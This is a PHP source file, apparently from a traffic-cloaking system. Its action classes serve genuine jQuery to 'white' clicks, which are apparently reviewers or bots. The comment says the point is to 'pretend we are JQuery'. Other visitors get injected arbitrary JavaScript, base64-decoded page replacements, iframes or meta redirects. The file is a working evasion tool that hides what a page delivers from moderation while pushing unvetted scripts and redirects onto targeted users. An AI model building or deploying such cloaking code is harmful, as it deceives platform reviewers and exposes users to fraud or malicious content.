<?php
require_once __DIR__ . '/redirect.php';
class TdsAction
{
    public string $click_type;
    public string $action;
    public string $value;
    public int $redirect_type;
    
    public function __construct(string $click_type, string $action, string $value, int $redirect_type=0)
    {
        $this->click_type = $click_type;
        $this->action = $action;
        $this->value = $value;
        $this->redirect_type = $redirect_type;
    }

    public function perform(){
        switch ($this->action){
            case 'html':
                echo $this->value;
                break;
            case 'redirect':
                redirect($this->value,$this->redirect_type,true);
                break;
            case 'error':
                http_response_code($this->value);
                break;
            default:
                die($this->value);
        }
    }
}

class JsAction extends TdsAction
{
    public static function FromTdsAction(TdsAction $action):JsAction
    {
        return new JsAction($action->click_type, $action->action, $action->value, $action->redirect_type);
    }

    private function content_replace():string
    {
        $js_code = file_get_contents(__DIR__.'/js/replace.js');
        $b64 = base64_encode($this->value);
        $js_code .= "\nreplaceContent('$b64');";
        return $js_code;
    }
    
    private function show_iframe():string
    {
        $js_code = file_get_contents(__DIR__.'/js/iframe.js');
        $b64 = base64_encode($this->value);
        $js_code .= "\nshowIframe('$b64');";
        return $js_code;
    }

    private function meta_redirect(): string
    {
        $js_code = file_get_contents(__DIR__.'/js/metaredirect.js');
        $js_code .= "\nmetaRedirect('$this->value');";
        return $js_code;
    }

    public function perform(){
        header('Content-Type: text/javascript');

        //for white clicks and js connect we don't need 
        //to change the existing white or to redirect
        //just stay where we are and pretend we are JQuery, haha
        if ($this->click_type === 'white') {
            $jq = get("https://code.jquery.com/jquery-3.6.1.min.js");
            echo $jq['content'];
            return;
        }

        if ($this->action === 'error') {
            http_response_code((int)$this->value);
            return;
        }
        
        switch ($this->action){
            case 'html_content':
                $js_code = $this->content_replace();
                break;
            case 'html_iframe':
                $js_code = $this->show_iframe();
                break;
            case 'redirect':
                $url = urldecode($this->value);
                $js_code = $this->meta_redirect();
                break;
            case 'js':
                $js_code = $this->value;
                break;
            default:
                http_response_code(404); 
                return;
        }

        echo $js_code;
    }
}


class PhpAction extends TdsAction
{
    public static function FromTdsAction(TdsAction $action):PhpAction
    {
        return new PhpAction($action->click_type, $action->action, $action->value, $action->redirect_type);
    }
    
    public function perform(){
        header('Content-Type: application/json');

        if ($this->action === 'error') {
            http_response_code((int)$this->value);
            echo json_encode(['action' => 'error']);
            return;
        }

        //for white clicks we just send action='none'
        if ($this->click_type === 'white') {
            echo json_encode(['action' => 'none']);
            return;
        }
        
        if ($this->action === 'html')
            $this->value = base64_encode($this->value);

        echo json_encode($this);
    }
}
